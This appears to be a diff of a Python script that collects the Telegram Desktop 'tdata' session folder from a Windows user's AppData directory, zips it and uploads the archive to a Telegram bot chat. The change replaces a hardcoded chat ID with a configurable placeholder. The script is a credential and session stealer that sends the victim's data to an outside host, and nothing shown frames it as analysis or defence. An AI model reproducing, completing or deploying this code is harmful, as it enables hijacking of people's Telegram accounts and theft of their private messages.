@@ -8,6 +8,7 @@ home = expanduser("~")
 rootDir = home + '/AppData/Roaming/Telegram Desktop/tdata/'
 entries = os.listdir(home + '/AppData/Roaming/Telegram Desktop/tdata/')
 TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
+TG_ID = "YOUR_TG_ID"
 import shutil
 localDir = os.getcwd()
 files = []
@@ -95,7 +96,7 @@ print(dirs)
 shutil.make_archive(localsavedir, 'zip', localsavedir)
 file = open(localsavedir +'.zip', 'rb')
 multipart_form_data = {
-    'chat_id': (None, 1163891909),
+    'chat_id': (None, TG_ID),
     'document': (localsavedir + '.zip', file),
 }
 
